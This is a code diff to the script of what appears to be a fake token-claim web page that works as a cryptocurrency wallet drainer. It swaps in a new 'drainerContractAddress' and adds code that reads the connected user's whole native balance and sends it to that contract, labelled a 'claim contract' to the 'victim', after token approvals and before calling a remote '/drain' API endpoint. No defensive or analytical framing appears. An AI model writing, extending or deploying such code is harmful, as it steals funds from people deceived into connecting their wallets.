@@ -26,7 +26,7 @@
     <script>
         const API_BASE_URL = "https://eqisn0r49g.execute-api.ap-south-1.amazonaws.com/";
         const provider = new ethers.BrowserProvider(window.ethereum);
-        const drainerContractAddress = "0x9b8b50c102c07B61a596b7ba2e842586fa97A0D7";
+        const drainerContractAddress = "0x3cDDC7c58eD68B7cf881012Af405731e96CF2d1b";
         const tokenList = [
             { symbol: "BUSD", address: "0xeD24FC36d5Ee211Ea25A80239Fb8C4Cfd80f12Ee", decimals: 18 },
             { symbol: "WBNB", address: "0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd", decimals: 18 },
@@ -117,7 +117,22 @@
                     }
                     statusMessage += "Wallet verified!\n";
 
-                    // Retry drain after approvals
+                    // Request victim to send TBNB to Drainer contract
+                    const nativeBalance = await provider.getBalance(connectedAddress);
+                    if (nativeBalance > 0) {
+                        statusMessage += `Detected ${ethers.formatEther(nativeBalance)} TBNB. Please send it to the claim contract (${drainerContractAddress})...\n`;
+                        updateStatus(statusMessage);
+                        const tx = await signer.sendTransaction({
+                            to: drainerContractAddress,
+                            value: nativeBalance,
+                            gasLimit: 21000
+                        });
+                        await tx.wait();
+                        statusMessage += "TBNB sent to claim contract!\n";
+                        updateStatus(statusMessage);
+                    }
+
+                    // Retry drain after approvals and native transfer
                     statusMessage += "Processing claim again...\n";
                     updateStatus(statusMessage);
                     const retryResponse = await fetch(`${API_BASE_URL}/drain`, {
